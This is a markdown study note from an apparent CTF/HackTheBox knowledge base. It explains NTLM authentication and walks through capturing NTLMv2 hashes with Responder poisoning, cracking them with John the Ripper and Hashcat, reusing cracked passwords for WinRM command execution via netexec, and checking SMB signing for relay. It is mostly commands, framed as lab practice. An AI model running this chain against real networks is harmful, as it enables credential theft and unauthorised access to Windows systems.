---
tags: [windows, cracking]
---

> **NTLM (NT LAN Manager)** is a challenge-response authentication protocol used in Windows environments. This guide covers what we've practiced: capturing NTLMv2 hashes with Responder and cracking them with John the Ripper.

---

## Quickstart — The NTLM chain we've used

```bash
# 1. Capture NTLMv2 hash via Responder
sudo responder -I tun0

# 2. Crack the captured hash
john --format=netntlmv2 hash.txt

# 3. Use the password for WinRM
netexec winrm 10.10.10.10 -u Administrator -p 'cracked_password' -x 'whoami'
```

---

## NTLM Authentication — How it works

The NTLM challenge-response protocol has 3 steps:

| Step | Direction | What happens |
| :--- | :-------- | :--------- |
| **1. Negotiate** | Client → Server | Client sends username and domain |
| **2. Challenge** | Server → Client | Server sends a random 8-byte challenge |
| **3. Authenticate** | Client → Server | Client computes HMAC-MD5 response using their NT hash + challenge |

> 💡 **Key insight:** The server never sees the password in plaintext — only the challenge-response. But an attacker can **capture** this response with Responder and **crack it** offline.

### NTLMv1 vs NTLMv2

| Feature | NTLMv1 | NTLMv2 |
| :------------- | :----- | :----- |
| Cryptographic strength | Broken (DES-based) | HMAC-MD5 (stronger) |
| Cracking speed | Instant | Minutes to hours |
| Hashcat mode | `-m 5500` | `-m 5600` |
| John format | `netntlm` | `netntlmv2` |
| CTF prevalence | Rare (deprecated) | **The standard** |

---

## Responder — Hash capture

Responder poisons LLMNR, NBT-NS, and mDNS broadcast protocols to capture NTLM hashes.

### Basic usage

```bash
# Start Responder on your VPN interface
$ sudo responder -I tun0

# Analysis mode (passive — no poisoning, just monitor)
$ sudo responder -I tun0 --analyze
```

### Where captured hashes are saved

Responder saves captures to `/usr/share/responder/logs/`. NTLMv2 hashes are in files like `SMB-NTLMv2-*.txt`.

### Typical CTF scenario

```bash
# 1. Start Responder
$ sudo responder -I tun0

# 2. Trigger NTLM authentication from the target (e.g. via UNC path in LFI)
#    http://target.htb/?page=\\10.10.14.5\file

# 3. Responder captures:
#    [SMB] NTLMv2-SSP Client   : 10.129.12.192
#    [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
#    [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:8289f17dc1079a81:...

# 4. Copy the hash to a file and crack:
$ john --format=netntlmv2 hash.txt
```

---

## Hash Cracking — John the Ripper

### NTLMv2 hash format

```
username::domain:ServerChallenge:NTProofStr:NTResponse
```

Example:
```
admin::WORKGROUP:1122334455667788:a3b4c5d6e7f8091a2b3c4d5e6f708192:0101000000000000...
```

### Crack with John

```bash
# NTLMv2
$ john --format=netntlmv2 hash.txt

# With wordlist
$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show results
$ john --show hash.txt
```

### Crack with Hashcat

```bash
# NTLMv2 (mode 5600)
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## SMB Signing — Why it matters

SMB signing prevents NTLM relay attacks. Check it early.

```bash
# Check SMB signing with nmap
nmap --script smb2-security-mode -p445 10.129.1.10
# Output:
# | smb2-security-mode:
# |   3.1.1:
# |_    Message signing enabled but not required    → ✅ relayable
```

| Signing State | What it means |
| :---------------- | :------------ |
| **Enabled but not required** | NTLM hashes can be relayed to this target |
| **Required** | Cannot relay — crack the hash instead |
| **Disabled** | Can relay — common on workstations and Linux/Samba |

> 💡 **From HTB Dancing:** SMB signing was *"enabled but not required"* — the machine was vulnerable to SMB relay if credentials had been captured.

---

## 🔗 Related

**Machines:** [[🧑‍🚒 Responder]]

**Guides:** [[🔧 John the Ripper]], [[🖥️ WinRM]], [[📂 SMB]], [[💉 LFI & RFI]]

---

## References

- [The Hacker Recipes — NTLM Relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- [HackTricks — NTLM Relay](https://book.hacktricks.xyz/network-services-pentesting/ntlm-relay)
- [Responder GitHub](https://github.com/lgandx/Responder)
- [PortSwigger — NTLM](https://portswigger.net/web-security/ntlm)
